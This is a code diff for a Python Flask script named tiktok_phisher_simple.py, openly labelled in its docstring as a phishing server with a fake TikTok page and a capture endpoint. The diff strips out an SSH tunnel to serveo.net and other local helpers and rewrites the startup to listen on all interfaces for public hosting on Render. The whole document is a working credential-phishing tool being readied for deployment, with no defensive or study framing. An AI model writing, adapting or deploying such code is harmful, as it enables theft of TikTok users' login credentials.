@@ -2,29 +2,14 @@
 # -*- coding: utf-8 -*-
 """
 tiktok_phisher_simple.py
-Server Phishing Sederhana + Serveo (Tanpa Install Ngrok).
+Server Phishing Sederhana (Render Ready - Clean).
 """
 
 import os
-import sys
-import subprocess
-import threading
-import time
-import webbrowser
-
-def install_deps():
-    try:
-        import flask
-    except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
-
-install_deps()
-
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# الصفحة المزورة (نفس التصميم اللي عملناه)
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -84,24 +69,7 @@ def capture():
         
     return jsonify({"status": "ok"}), 200
 
-def open_browser():
-    time.sleep(1.5)
-    webbrowser.open("http://127.0.0.1:5000")
-
-def start_serveo():
-    print("[*] جاري فتح رابط عام (Serveo)...")
-    print("[*] الرابط هيظهر تحت في سطر فيه 'Forwarding HTTP traffic from:'")
-    print("-" * 50)
-    # أمر Serveo (SSH) عشان يعمل البورت فوروارد
-    os.system("ssh -R 80:localhost:5000 serveo.net")
-
 if __name__ == '__main__':
-    print("=" * 50)
-    print("   TIKTOK PHISHER (SIMPLE)")
-    print("=" * 50)
-    
-    # تشغيل السيرفر في الخلفية
-    threading.Thread(target=open_browser, daemon=True).start()
-    threading.Thread(target=start_serveo, daemon=True).start()
-    
-    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
+    # Render بيحدد البورت أوتوماتيك، إحنا بنقراه من env
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
